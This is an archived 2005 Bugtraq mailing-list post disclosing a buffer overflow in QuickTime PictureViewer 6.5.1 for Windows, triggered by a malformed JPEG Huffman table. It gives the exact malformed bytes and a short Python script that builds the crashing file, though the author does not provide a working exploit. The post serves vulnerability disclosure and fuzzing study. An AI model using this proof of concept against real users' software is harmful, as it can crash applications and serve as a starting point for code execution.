=== Content from marc.info_d76a7b6e_20250125_173945.html ===

```
[[prev in list](?l=bugtraq&m=111204382806117&w=2)] [[next in list](?l=bugtraq&m=111187326121417&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    QuickTime malformed JPEG buffer overflow
From:       [<liquid () cyberspace ! org>](?a=111151630000002&r=1&w=2)
Date:       [2005-03-26 18:46:15](?l=bugtraq&r=1&w=2&b=200503)
Message-ID: [20050326230848.12878.qmail () www ! securityfocus ! com](?i=20050326230848.12878.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=111186277521713&q=mbox) or [body](?l=bugtraq&m=111186277521713&q=raw)]

When fuzzing some application with malformed input files, if we want to discover some \
vulnerability we have to create input file which is very close to valid file but yet \
malformed in some way. In that way chances for discovery are greater. Now let's play \
with JPEG format. We concentrate on Huffman table segment. Marker for DHT is 0xffc4.

Now, take valid JPEG file and replace first DHT with this malformed DHT:

0xffc4021100ffff000000000000+0x01*510

Open this modified file with QuickTime PictureViewer (version 6.5.1) for Windows and \
QuickTime will crash with Windows reporting access violation error. Next step would \
be creating exploit, but I leave that to people with more skill in doing that.

Here is quick and dirty script in Python for creating such malformed file:

import struct
f=open(raw_input("enter the path to the input file:\n"),"rb")
a=f.read()
f.close()
n=a.index("\xff\xc4")
b=a[:n]+"\xff\xc4\x02\x11\x00\xff\xff"+"\x00"*14+"\x01"*510
+a[n+2+struct.unpack("!H",a[n+2:n+4])[[0]](#0):]
f=open(raw_input("enter the path to the output file:\n"),"wb")
f.write(b)
f.close()

For details about JPEG format take a look at:

<http://www.w3.org/Graphics/JPEG/itu-t81.pdf>

[[prev in list](?l=bugtraq&m=111204382806117&w=2)] [[next in list](?l=bugtraq&m=111187326121417&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


